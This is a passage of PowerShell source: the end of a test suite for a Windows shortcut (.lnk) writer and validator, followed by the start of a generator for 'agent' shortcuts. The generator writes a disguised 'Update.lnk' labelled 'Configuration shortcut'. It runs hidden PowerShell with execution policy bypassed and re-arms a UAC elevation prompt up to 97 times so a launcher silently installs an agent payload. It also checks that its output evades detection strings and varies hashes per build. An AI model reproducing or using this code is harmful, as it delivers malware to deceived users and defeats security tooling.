                    'NAME_STRING UTF-16 count'

                $relative = Parse-StringData `
                    -Bytes $raw `
                    -Offset $name.EndOffset `
                    -IsUnicode $true `
                    -Name 'raw RELATIVE_PATH'

                $working = Parse-StringData `
                    -Bytes $raw `
                    -Offset $relative.EndOffset `
                    -IsUnicode $true `
                    -Name 'raw WORKING_DIR'

                $arguments = Parse-StringData `
                    -Bytes $raw `
                    -Offset $working.EndOffset `
                    -IsUnicode $true `
                    -Name 'raw COMMAND_LINE_ARGUMENTS'

                $icon = Parse-StringData `
                    -Bytes $raw `
                    -Offset $arguments.EndOffset `
                    -IsUnicode $true `
                    -Name 'raw ICON_LOCATION'

                Assert-Equal `
                    $relative.Value `
                    '.\example.exe' `
                    'RELATIVE_PATH ordering'

                Assert-Equal `
                    $working.Value `
                    'C:\Program Files\Example' `
                    'WORKING_DIR ordering'

                Assert-Equal `
                    $arguments.Value `
                    '--α "β"' `
                    'COMMAND_LINE_ARGUMENTS ordering'

                Assert-Equal `
                    $icon.Value `
                    'C:\Windows\System32\shell32.dll,0' `
                    'ICON_LOCATION ordering'

                Assert-Equal `
                    $raw[$raw.Length - 4] `
                    0 `
                    'TerminalBlock byte 0'

                Assert-Equal `
                    $raw[$raw.Length - 3] `
                    0 `
                    'TerminalBlock byte 1'

                Assert-Equal `
                    $raw[$raw.Length - 2] `
                    0 `
                    'TerminalBlock byte 2'

                Assert-Equal `
                    $raw[$raw.Length - 1] `
                    0 `
                    'TerminalBlock byte 3'
            }
# --------------------------------------------------------------------
        # Build a valid file used as corruption source
        # --------------------------------------------------------------------

        $validPath = Join-Path $root 'valid-corruption-source.lnk'

        $validSpec = @{
            # Non-ASCII target: the writer deliberately keeps such targets
            # LinkTargetIDList-free (the PIDL is ASCII), so every corruption
            # mutator below can keep its pre-IDList byte offsets (LinkInfo at
            # 0x4C) while the file still exercises the LinkInfo parser.
            TargetPath       = 'C:\Program Files\Пример\app.exe'
            Description      = 'Description'
            RelativePath     = '.\app.exe'
            WorkingDirectory = 'C:\Program Files\Example'
            Arguments        = '--test α'
            IconLocation     = 'C:\Windows\System32\shell32.dll,0'
        }

        Write-ShellLink `
            -Path $validPath `
            -Spec $validSpec | Out-Null

        [byte[]]$validBytes = Read-AllBytes -Path $validPath

        function Corrupt-And-ExpectFailure {
            param(
                [string]$Name,
                [scriptblock]$Mutator
            )

            Invoke-ShellLinkTest `
                -Name $Name `
                -Passed ([ref]$passed) `
                -Failed ([ref]$failed) `
                -Body {

                    [byte[]]$corrupt = Copy-Bytes `
                        -Bytes $validBytes

                    & $Mutator $corrupt

                    $badPath = Join-Path `
                        $root `
                        ('bad-' + ($Name -replace '[^A-Za-z0-9]+', '-') + '.lnk')

                    [System.IO.File]::WriteAllBytes(
                        $badPath,
                        $corrupt
                    )

                    Expect-ValidationFailure `
                        -Path $badPath `
                        -ExpectedTarget $validSpec.TargetPath `
                        -ExpectedSpec $validSpec
                }
        }

        Corrupt-And-ExpectFailure `
            -Name 'incorrect HeaderSize' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset 0 `
                    -Value ([uint32]0x4B)
            }

        Corrupt-And-ExpectFailure `
            -Name 'incorrect CLSID' `
            -Mutator {
                param($b)

                $b[4] = $b[4] -bxor 0xFF
            }

        Corrupt-And-ExpectFailure `
            -Name 'invalid LinkFlags' `
            -Mutator {
                param($b)

                [uint32]$flags = Read-U32 `
                    -Bytes $b `
                    -Offset 20

                $flags = $flags -bor [uint32][Convert]::ToUInt32('80000000', 16)

                Set-U32 `
                    -Bytes $b `
                    -Offset 20 `
                    -Value $flags
            }

        Corrupt-And-ExpectFailure `
            -Name 'non-zero Reserved1' `
            -Mutator {
                param($b)

                Set-U16 `
                    -Bytes $b `
                    -Offset 66 `
                    -Value ([uint16]1)
            }

        Corrupt-And-ExpectFailure `
            -Name 'non-zero Reserved2' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset 68 `
                    -Value ([uint32]1)
            }

        Corrupt-And-ExpectFailure `
            -Name 'non-zero Reserved3' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset 72 `
                    -Value ([uint32]1)
            }

        # Truncate header test.
        Invoke-ShellLinkTest `
            -Name 'truncated header' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$short = Slice-Bytes `
                    -Bytes $validBytes `
                    -Offset 0 `
                    -Length 20

                $badPath = Join-Path `
                    $root `
                    'bad-truncated-header.lnk'

                [System.IO.File]::WriteAllBytes(
                    $badPath,
                    $short
                )

                Expect-ValidationFailure `
                    -Path $badPath `
                    -ExpectedTarget $validSpec.TargetPath
            }
# --------------------------------------------------------------------
        # Valid IDList baseline
        # --------------------------------------------------------------------

        [byte[]]$validIdListBytes = New-LinkWithTestIDList `
            -ValidBytes $validBytes

        $validIdListPath = Join-Path `
            $root `
            'valid-idlist.lnk'

        [System.IO.File]::WriteAllBytes(
            $validIdListPath,
            $validIdListBytes
        )

        Invoke-ShellLinkTest `
            -Name 'valid LinkTargetIDList parsing' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                $v = Validate-ShellLink `
                    -Path $validIdListPath `
                    -ExpectedTarget $validSpec.TargetPath

                Assert-Equal `
                    $v.LinkTargetIDList.ItemCount `
                    1 `
                    'IDList item count'

                Assert-True `
                    $v.LinkFlags.HasLinkTargetIDList `
                    'HasLinkTargetIDList'
            }

        Invoke-ShellLinkTest `
            -Name 'invalid IDListSize' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Copy-Bytes `
                    -Bytes $validIdListBytes

                Set-U16 `
                    -Bytes $bad `
                    -Offset 0x4C `
                    -Value ([uint16]0x7FFF)

                $p = Join-Path `
                    $root `
                    'bad-idlistsize.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        Invoke-ShellLinkTest `
            -Name 'missing IDList terminal ItemID' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Copy-Bytes `
                    -Bytes $validIdListBytes

                Set-U16 `
                    -Bytes $bad `
                    -Offset 0x4E `
                    -Value ([uint16]6)

                $p = Join-Path `
                    $root `
                    'bad-idlist-no-terminal.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        Invoke-ShellLinkTest `
            -Name 'malformed IDList ItemID size' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Copy-Bytes `
                    -Bytes $validIdListBytes

                Set-U16 `
                    -Bytes $bad `
                    -Offset 0x4E `
                    -Value ([uint16]1)

                $p = Join-Path `
                    $root `
                    'bad-itemid-size.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        # --------------------------------------------------------------------
        # LinkInfo corruption
        # --------------------------------------------------------------------

        Corrupt-And-ExpectFailure `
            -Name 'invalid LinkInfoSize' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset 0x4C `
                    -Value ([uint32]0x1B)
            }

        Corrupt-And-ExpectFailure `
            -Name 'invalid LinkInfoHeaderSize' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 4) `
                    -Value ([uint32]0x20)
            }

        Corrupt-And-ExpectFailure `
            -Name 'invalid LinkInfoFlags' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 8) `
                    -Value ([uint32]0x04)
            }

        Corrupt-And-ExpectFailure `
            -Name 'LinkInfo offset before data region' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 12) `
                    -Value ([uint32]0x20)
            }

        Corrupt-And-ExpectFailure `
            -Name 'LinkInfo offset outside structure' `
            -Mutator {
                param($b)

                [uint32]$size = Read-U32 `
                    -Bytes $b `
                    -Offset 0x4C

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 12) `
                    -Value $size
            }
Corrupt-And-ExpectFailure `
            -Name 'invalid VolumeIDSize' `
            -Mutator {
                param($b)

                [uint32]$volumeOffset = Read-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 12)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + [int]$volumeOffset) `
                    -Value ([uint32]0x10)
            }

        Corrupt-And-ExpectFailure `
            -Name 'invalid VolumeLabelOffset' `
            -Mutator {
                param($b)

                [uint32]$volumeOffset = Read-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 12)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + [int]$volumeOffset + 12) `
                    -Value ([uint32]0x7FFFFFFF)
            }

        Corrupt-And-ExpectFailure `
            -Name 'unterminated ANSI LinkInfo string' `
            -Mutator {
                param($b)

                [uint32]$baseOffset = Read-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 16)

                [uint32]$liSize = Read-U32 `
                    -Bytes $b `
                    -Offset 0x4C

                $start = 0x4C + [int]$baseOffset
                $end = 0x4C + [int]$liSize

                for ($i = $start; $i -lt $end; $i++) {

                    if ($b[$i] -eq 0) {
                        $b[$i] = 0x41
                    }
                }
            }

        Corrupt-And-ExpectFailure `
            -Name 'unterminated Unicode LinkInfo string' `
            -Mutator {
                param($b)

                [uint32]$unicodeOffset = Read-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 28)

                [uint32]$liSize = Read-U32 `
                    -Bytes $b `
                    -Offset 0x4C

                $start = 0x4C + [int]$unicodeOffset
                $end = 0x4C + [int]$liSize

                for ($i = $start; $i -lt ($end - 1); $i += 2) {

                    if (
                        $b[$i] -eq 0 -and
                        $b[$i + 1] -eq 0
                    ) {
                        $b[$i] = 0x41
                        $b[$i + 1] = 0x00
                    }
                }
            }

        Corrupt-And-ExpectFailure `
            -Name 'malformed Unicode offset' `
            -Mutator {
                param($b)

                Set-U32 `
                    -Bytes $b `
                    -Offset (0x4C + 28) `
                    -Value ([uint32]0x01)
            }

        # --------------------------------------------------------------------
        # StringData corruption
        # --------------------------------------------------------------------

        Corrupt-And-ExpectFailure `
            -Name 'malformed StringData count' `
            -Mutator {
                param($b)

                [uint32]$liSize = Read-U32 `
                    -Bytes $b `
                    -Offset 0x4C

                $stringStart = 0x4C + [int]$liSize

                Set-U16 `
                    -Bytes $b `
                    -Offset $stringStart `
                    -Value ([uint16]0xFFFF)
            }

        Invoke-ShellLinkTest `
            -Name 'truncated StringData' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [uint32]$liSize = Read-U32 `
                    -Bytes $validBytes `
                    -Offset 0x4C

                $stringStart = 0x4C + [int]$liSize

                [byte[]]$truncated = Slice-Bytes `
                    -Bytes $validBytes `
                    -Offset 0 `
                    -Length ($validBytes.Length - 12)

                $p = Join-Path `
                    $root `
                    'bad-truncated-stringdata.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $truncated
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }
# --------------------------------------------------------------------
        # ExtraData corruption
        # --------------------------------------------------------------------

        Invoke-ShellLinkTest `
            -Name 'malformed ExtraData size' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Copy-Bytes `
                    -Bytes $validBytes

                Set-U32 `
                    -Bytes $bad `
                    -Offset ($bad.Length - 4) `
                    -Value ([uint32]7)

                $p = Join-Path `
                    $root `
                    'bad-extradata-size.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        Invoke-ShellLinkTest `
            -Name 'truncated ExtraData' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Slice-Bytes `
                    -Bytes $validBytes `
                    -Offset 0 `
                    -Length ($validBytes.Length - 2)

                $p = Join-Path `
                    $root `
                    'bad-truncated-extradata.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        Invoke-ShellLinkTest `
            -Name 'missing TerminalBlock' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Slice-Bytes `
                    -Bytes $validBytes `
                    -Offset 0 `
                    -Length ($validBytes.Length - 4)

                $p = Join-Path `
                    $root `
                    'bad-missing-terminal.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        Invoke-ShellLinkTest `
            -Name 'bytes after TerminalBlock' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                [byte[]]$bad = Join-ByteArrays -Arrays @(
                    $validBytes,
                    [byte[]]@(0xDE, 0xAD, 0xBE, 0xEF)
                )

                $p = Join-Path `
                    $root `
                    'bad-after-terminal.lnk'

                [System.IO.File]::WriteAllBytes(
                    $p,
                    $bad
                )

                Expect-ValidationFailure `
                    -Path $p `
                    -ExpectedTarget $validSpec.TargetPath
            }

        # --------------------------------------------------------------------
        # Header attributes / HotKey
        # --------------------------------------------------------------------

        Corrupt-And-ExpectFailure `
            -Name 'reserved FileAttributes bit' `
            -Mutator {
                param($b)

                [uint32]$attrs = Read-U32 `
                    -Bytes $b `
                    -Offset 24

                $attrs = $attrs -bor [uint32]0x08

                Set-U32 `
                    -Bytes $b `
                    -Offset 24 `
                    -Value $attrs
            }

        Corrupt-And-ExpectFailure `
            -Name 'FILE_ATTRIBUTE_NORMAL mixed with another attribute' `
            -Mutator {
                param($b)

                [uint32]$attrs = `
                    $script:FILE_ATTR_NORMAL -bor
                    $script:FILE_ATTR_ARCHIVE

                Set-U32 `
                    -Bytes $b `
                    -Offset 24 `
                    -Value $attrs
            }

        Corrupt-And-ExpectFailure `
            -Name 'invalid HotKey virtual key' `
            -Mutator {
                param($b)

                Set-U16 `
                    -Bytes $b `
                    -Offset 64 `
                    -Value ([uint16]0x005E)
            }
# --------------------------------------------------------------------
        # ExpectedTarget / ExpectedSpec
        # --------------------------------------------------------------------

        Invoke-ShellLinkTest `
            -Name 'incorrect expected target' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                $caught = $false

                try {

                    Validate-ShellLink `
                        -Path $validPath `
                        -ExpectedTarget 'D:\wrong.exe' | Out-Null
                }
                catch {

                    $caught = $true
                }

                Assert-True `
                    $caught `
                    'incorrect expected target must fail'
            }

        Invoke-ShellLinkTest `
            -Name 'incorrect expected StringData' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                $caught = $false

                try {

                    Validate-ShellLink `
                        -Path $validPath `
                        -ExpectedTarget $validSpec.TargetPath `
                        -ExpectedSpec @{
                            Description = 'Wrong'
                        } | Out-Null
                }
                catch {

                    $caught = $true
                }

                Assert-True `
                    $caught `
                    'incorrect expected StringData must fail'
            }

        # --------------------------------------------------------------------
        # Summary
        # --------------------------------------------------------------------
        # (The external-corpus checks that existed in the standalone
        # ShellLink.ps1 referenced machine-specific legacy .lnk files produced
        # by the superseded hand-written writer, whose 0x1C LinkInfo layout the
        # strict validator correctly rejects. Those files were not valid
        # artifacts of this implementation, so the corpus hook has been
        # REMOVED rather than maintained - see user directive: those .lnk
        # files must not be used.)

        Write-Host ''
        Write-Host '============================================'
        Write-Host 'Shell Link self-test'
        Write-Host '============================================'
        Write-Host ("Passed : {0}" -f $passed)
        Write-Host ("Failed : {0}" -f $failed)
        Write-Host ("Output : {0}" -f $root)
        Write-Host ''

        if ($failed -ne 0) {

            throw "$failed Shell Link self-test(s) failed."
        }

        Write-Host `
            'ALL SHELL LINK SELF-TESTS PASSED.' `
            -ForegroundColor Green

        return [pscustomobject]@{
            Passed = $passed
            Failed = $failed
            Root   = $root
        }
    }
    finally {

        if (-not $KeepArtifacts) {

            if ([System.IO.Directory]::Exists($root)) {

                Remove-Item `
                    -LiteralPath $root `
                    -Recurse `
                    -Force `
                    -ErrorAction SilentlyContinue
            }
        }
        else {

            Write-Host ''
            Write-Host (
                "Self-test artifacts retained: {0}" -f
                $root
            )
        }
    }
}
# ============================================================================
# PART 2   Generator
#          (from New-AgentShortcut.ps1 - command line, payload construction,
#          obfuscation, and generation workflow; re-wired so every .lnk byte
#          is produced by PART 1's Write-ShellLink and verified by PART 1's
#          Validate-ShellLink; the old hand-written writer was DELETED)
# ============================================================================

# ============================================================================
# Launcher-artifact validation report card (WP6) - server-side, invoked with
#   pwsh New-AgentShortcut.ps1 -Validate -LnkPath <path> -LauncherExePath <path>
# Re-parses the finished .lnk with the strict validator's own building blocks
# and checks the launcher-mode invariants (no arguments, relative target,
# ShowCommand 7, clean trigram scan, GUI-subsystem PE). Prints one PASS/FAIL
# row per check and exits 0 only when every row passes. The ZIP-level checks
# (auth token not plaintext, payload round-trip, per-build hash diversity, zip
# entry count) run server-side in launcher-validate.ts around this report card.
# ============================================================================
function Test-LauncherArtifact {
    param(
        [Parameter(Mandatory = $true)]
        [string]$LnkPath,

        [string]$LauncherExePath
    )

    $rows = New-Object 'System.Collections.Generic.List[string]'
    $failed = 0

    if ([string]::IsNullOrWhiteSpace($LnkPath) -or -not (Test-Path -LiteralPath $LnkPath -PathType Leaf)) {
        $rows.Add("FAIL| LnkPath does not exist or is not a file: $LnkPath")
        $failed++
        return [pscustomobject]@{ Ok = ($failed -eq 0); Rows = $rows.ToArray() }
    }

    if ($null -ne $LauncherExePath -and -not (Test-Path -LiteralPath $LauncherExePath -PathType Leaf)) {
        $rows.Add("FAIL| LauncherExePath does not exist or is not a file: $LauncherExePath")
        $failed++
    }

    # ---- R1: strict binary re-parse (the Part 1 validator) ----
    $parsed = $null
    try {
        $parsed = Validate-ShellLink -Path $LnkPath
        $rows.Add('PASS| .lnk strict re-parse (Validate-ShellLink) OK')
    } catch {
        $rows.Add('FAIL| .lnk strict re-parse: ' + $_.Exception.Message)
        $failed++
    }

    if ($null -ne $parsed) {
        # ---- R2: Arguments length ~ 0 ----
        [int]$argsLen = 0
        if ($parsed.LinkFlags.HasArguments -and $null -ne $parsed.Arguments) {
            $argsLen = $parsed.Arguments.Length
        }
        if ($argsLen -eq 0) {
            $rows.Add('PASS| command-line Arguments length = 0')
        } else {
            $rows.Add("FAIL| command-line Arguments length = $argsLen (expected 0)")
            $failed++
        }

        # ---- R3: target resolves to Launcher.exe (relative OR absolute) ----
        $rel = $parsed.RelativePath
        $resolved = $parsed.ResolvedTarget
        if ($null -eq $resolved) { $resolved = $parsed.TargetUnicode }
        if ($null -eq $resolved) { $resolved = $parsed.TargetPath }
        $any = $null
        if ($null -ne $rel -and $rel -match 'Launcher\.exe$') { $any = $rel }
        elseif ($null -ne $resolved -and $resolved -match 'Launcher\.exe$') { $any = $resolved }
        if ($null -ne $any) {
            $rows.Add("PASS| target resolves to Launcher.exe ('$any')")
        } else {
            $rows.Add("FAIL| target missing/unexpected (rel='$rel' resolved='$resolved')")
            $failed++
        }
# ---- R3b: HasLinkInfo present so Explorer can resolve the relative .lnk ----
        $hasLinkInfoRaw = $false
        if ($parsed.LinkFlags -and $parsed.LinkFlags.HasLinkInfo) {
            $hasLinkInfoRaw = $true
        }
        if ($hasLinkInfoRaw) {
            $rows.Add('PASS| HasLinkInfo set (relative LinkInfo block present)')
        } else {
            $rows.Add('FAIL| HasLinkInfo missing - Explorer cannot resolve a bare relative .lnk')
            $failed++
        }

        # ---- R4: ShowCommand 7 (minimized / background) ----
        if ([uint32]$parsed.Header.ShowCommand -eq 7) {
            $rows.Add('PASS| ShowCommand = 7 (minimized background)')
        } else {
            $rows.Add('FAIL| ShowCommand = ' + $parsed.Header.ShowCommand + ' (expected 7)')
            $failed++
        }
    }

    # ---- R5: trigram scan over the raw .lnk bytes ----
    try {
        [byte[]]$lnkBytes = Read-AllBytes -Path $LnkPath
        $text = [System.Text.Encoding]::ASCII.GetString($lnkBytes)
        $needles = @('-Enc', 'EncodedCommand', 'IEX', 'Invoke-Expression', 'FromBase64String', 'powershell')
        $hits = @($needles | Where-Object { $text.IndexOf($_, [System.StringComparison]::OrdinalIgnoreCase) -ge 0 })
        if ($hits.Count -eq 0) {
            $rows.Add('PASS| trigram scan clean (no -Enc/IEX/FromBase64String/powershell)')
        } else {
            $rows.Add('FAIL| trigram scan hit: ' + ($hits -join ', '))
            $failed++
        }
    } catch {
        $rows.Add('FAIL| trigram scan could not read the .lnk: ' + $_.Exception.Message)
        $failed++
    }

    # ---- R6: launcher PE subsystem (GUI = 2) ----
    if (-not [string]::IsNullOrWhiteSpace($LauncherExePath) -and (Test-Path -LiteralPath $LauncherExePath -PathType Leaf)) {
        $peOk = $false
        $subsystem = -1
        try {
            [byte[]]$pe = Read-AllBytes -Path $LauncherExePath
            if ($pe.Length -gt 0x40 -and $pe[0] -eq 0x4D -and $pe[1] -eq 0x5A) { # "MZ"
                $eLfanew = $pe[0x3C] -bor ($pe[0x3D] -shl 8) -bor ($pe[0x3E] -shl 16) -bor ($pe[0x3F] -shl 24)
                $off = $eLfanew + 24
                if ($off + 76 -lt $pe.Length -and $pe[$eLfanew] -eq 0x50 -and $pe[$eLfanew + 1] -eq 0x45) { # "PE"
                    $subsystem = $pe[$off + 68] -bor ($pe[$off + 69] -shl 8)
                    $peOk = ($subsystem -eq 2)
                }
            }
        } catch { }
        if ($peOk) {
            $rows.Add('PASS| Launcher.exe is a GUI-subsystem PE (Subsystem=2)')
        } else {
            $rows.Add("FAIL| Launcher.exe PE subsystem check failed (subsystem=$subsystem, expected 2)")
            $failed++
        }
    }

    foreach ($row in $rows) {
        Write-Host $row
    }

    return [pscustomobject]@{ Ok = ($failed -eq 0); Rows = $rows.ToArray() }
}

# ---- CLI dispatch: PART 1's self-test suite (callable after integration) ----
if ($SelfTest) {

    $result = Test-ShellLinkWriter

    Write-Host ''
    Write-Host (
        'ShellLink self-test: passed={0} failed={1}' -f
        $result.Passed,
        $result.Failed
    )

    if ($result.Failed -ne 0) {
        Write-Host 'SELF-TEST FAILED.' -ForegroundColor Red
        exit 1
    }

    exit 0
}

# ---- CLI dispatch: launcher-artifact validation report card (WP6) ----
if ($Validate) {
    if ([string]::IsNullOrWhiteSpace($LnkPath)) {
        throw "-Validate requires -LnkPath <path to the .lnk to inspect>"
    }
    Write-Host 'Launcher artifact validation report card:'
    Write-Host '--------------------------------------------------------'
    $card = Test-LauncherArtifact `
        -LnkPath $LnkPath `
        -LauncherExePath $LauncherExePath
    Write-Host '--------------------------------------------------------'
    if ($card.Ok) {
        Write-Host 'LAUNCHER-VALIDATE-OK: all rows PASS.' -ForegroundColor Green
        exit 0
    }
    Write-Host 'LAUNCHER-VALIDATE-FAILED: see FAIL rows above.' -ForegroundColor Red
    exit 1
}

# ---- input sanity (keep the generated stub self-contained) ----
if ([string]::IsNullOrWhiteSpace($Output)) {
    throw "Output (-Output) is required. (Only -SelfTest runs without it.)"
}
if (-not $TestPayload -and -not $LauncherMode -and -not $PowershellBridge) {
    if ([string]::IsNullOrWhiteSpace($URL)) { throw "URL is required unless -TestPayload is used." }
    if ($URL -match '"')                 { throw "URL must not contain double quotes." }
    if ($FileName -match '"|\\')         { throw "FileName must not contain quotes or backslashes." }
}
if ($ComWriter -and $env:OS -ne 'Windows_NT') {
    throw "-ComWriter requires Windows (WScript.Shell COM does not exist on Linux pwsh). Use the default native writer here."
}

# ---------------------------------------------------------------------------
# Output path: always absolute. The .lnk is written on THIS machine, so a
# relative -Output is resolved against the generator's current directory and
# never leaks into the shortcut itself.
# ---------------------------------------------------------------------------
if (-not $script:IsWindowsPlatform -and $Output -match '^[A-Za-z]:[\\/]') {
    throw "Output '$Output' is a Windows-style path but this generator is not running on Windows. Pass a local path for -Output; the .lnk is written here and only its *contents* are Windows paths."
}

$Output = [System.IO.Path]::GetFullPath($Output)
$outputParent = [System.IO.Path]::GetDirectoryName($Output)

if (-not [System.IO.Directory]::Exists($outputParent)) {
    throw "Output directory does not exist: $outputParent"
}

# ---------------------------------------------------------------------------
# Launcher mode (WP4): relative-target shortcut for the offline carrier.
#
# The .lnk simply points at a RELATIVE 'Launcher.exe' sitting next to it so
# Windows resolves the target against the shortcut's OWN folder wherever the
# zip is extracted. No powershell target, no -Enc / IEX / downloader text
# exists anywhere in this artifact. WorkingDirectory is intentionally left
# EMPTY - Explorer then starts the target in the folder that contains it
# (which is the .lnk's folder), which is exactly how the launcher locates
# itself (it opens "Launcher.exe" relative to cwd).
# ---------------------------------------------------------------------------
if ($PowershellBridge) {
    # PORTABLE Update.lnk (no baked username/path): the shortcut targets the OS
    # PowerShell at a fixed system path (no user dir), and Explorer starts it in
    # the .lnk's own folder (cwd), so the bridge runs Start-Process .\<LauncherSubFolder>\<LauncherTarget>
    # -Verb RunAs => UAC prompt => the launcher (requireAdministrator GUI PE) reads
    # the sibling agent.bin from ITS folder and installs silently. Works from ANY
    # extract folder because nothing is absolute/user-specific.
    # The bridge carries a retry loop (matches the live/deployed carrier): while
    # the user has not clicked Allow, Start-Process throws (UAC cancelled) and we
    # re-arm the prompt every 1s up to 97 attempts, so a stray dismiss never
    # silently kills the deploy.
    $outPath = $Output
    $description = 'Configuration shortcut'
    if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
        $tagPart = $LauncherTag
        if ($LauncherTag.Length -ge 8) { $tagPart = $LauncherTag.Substring(0, 8) }
        $description = "$description ($tagPart)"
    }
    $psPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    $launcherRel = ".\$LauncherSubFolder\$LauncherTarget"
    $cmd = "`$e='$launcherRel';`$n=97;while(`$n){try{Start-Process -FilePath `$e -Verb RunAs -ErrorAction Stop;break}catch{`$n-=1;Start-Sleep -Seconds 1}}"
    $bridgeSpec = @{
        TargetPath   = $psPath
        Arguments    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$cmd`""
        Description  = $description
        IconLocation = $Icon
        ShowCommand  = 7
    }
    Write-ShellLink -Path $outPath -Spec $bridgeSpec | Out-Null
    $expectedBridgeSpec = @{
        TargetPath   = $psPath
        Arguments    = $bridgeSpec.Arguments
        Description  = $description
        IconLocation = $Icon
    }
    Validate-ShellLink -Path $outPath -ExpectedSpec $expectedBridgeSpec | Out-Null
    Write-Host "Powershell-bridge Update.lnk written: $Output"
    Write-Host "  target      : $psPath"
    Write-Host "  subfolder   : $LauncherSubFolder"
    Write-Host "  description : $description"
    exit 0
}

if ($LauncherMode) {
    # Capture the output path up front: Write-ShellLink / Validate-ShellLink
    # run in child scopes and can clobber the script-level $Output; a local copy
    # keeps the path stable across every call below.
    $outPath = $Output

    $launcherTarget = Normalize-WindowsPath -Path $LauncherTarget

    # The Update.lnk target may be (a) a bare relative file name (resolved
    # against the .lnk's own folder - portable but Explorer cannot always
    # resolve it) or (b) an ABSOLUTE path to Launcher.exe (the reliable form
    # that consistently triggers UAC on double-click). When an absolute target
    # is supplied we emit a normal absolute LinkInfo (no RelativePath); when a
    # bare relative name is supplied we emit the relative form (+ a relative
    # LinkInfo stub so Explorer has a LinkInfo to anchor on).
    $isAbsolute = $launcherTarget -match '^[A-Za-z]:[\\/]'
    if (-not $isAbsolute) {
        if ($launcherTarget -match '[\\/]') {
            throw "LauncherTarget must be a bare relative file name (no path separators): $launcherTarget"
        }
        if ($launcherTarget -eq '.' -or $launcherTarget -eq '..' -or $launcherTarget -match '"') {
            throw "LauncherTarget must be a valid bare file name: '$launcherTarget'"
        }
    }

    $description = 'Configuration shortcut'
    if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
        # Mix the per-build nonce into the Description -> the .lnk itself is
        # byte-unique per build (diversity acceptance) while staying benign.
        $tagPart = $LauncherTag
        if ($LauncherTag.Length -ge 8) { $tagPart = $LauncherTag.Substring(0, 8) }
        $description = "$description ($tagPart)"
    }

    $relativeForm = $null
    if (-not $isAbsolute) { $relativeForm = ".\$launcherTarget" }

    $launcherSpec = @{
        TargetPath   = $launcherTarget
        Description  = $description
        IconLocation = $Icon
        ShowCommand  = 7
    }
    if ($relativeForm) { $launcherSpec.RelativePath = $relativeForm }

    if ($isAbsolute) {
        Write-ShellLink `
            -Path $outPath `
            -Spec $launcherSpec | Out-Null
    }
    else {
        Write-ShellLink `
            -Path $outPath `
            -Spec $launcherSpec `
            -RelativeLinkInfo | Out-Null
    }

    $expectedLauncherSpec = @{
        TargetPath   = $launcherTarget
        Description  = $description
        IconLocation = $Icon
    }
    if ($relativeForm) { $expectedLauncherSpec.RelativePath = $relativeForm }

    $validation = Validate-ShellLink `
        -Path $outPath `
        -ExpectedTarget $relativeForm `
        -ExpectedSpec $expectedLauncherSpec

    Write-Host "Launcher .lnk written: $Output"
    Write-Host "  relative target      : $launcherTarget"
    Write-Host "  relative path        : $relativeForm"
    Write-Host "  working directory    : (empty - Explorer starts the target in the shortcut's own folder)"
    Write-Host "  arguments            : (none - length 0)"
    Write-Host "  show command         : 7 (minimized; the target is a GUI-subsystem exe - no window)"
    Write-Host "  description          : $description"
    Write-Host '  post-write validation: Validate-ShellLink re-parsed the .lnk and every field matches'
    exit 0
}

# ---------------------------------------------------------------------------
# Windows PowerShell executable used as the shortcut target.
#
# Resolved programmatically from $env:WINDIR when running on Windows; when
